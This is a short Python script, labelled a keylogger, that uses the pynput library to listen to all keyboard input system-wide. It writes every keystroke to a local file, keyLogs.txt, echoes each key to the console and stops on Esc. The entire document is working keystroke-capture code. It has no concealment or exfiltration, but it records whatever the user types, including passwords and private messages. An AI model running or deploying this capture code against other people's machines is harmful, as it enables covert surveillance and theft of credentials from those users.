# keylogger using pyinput module
from pynput.keyboard import Key, Listener
#listener is a handler that manages key strokes
keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('keyLogs.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)

            #for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
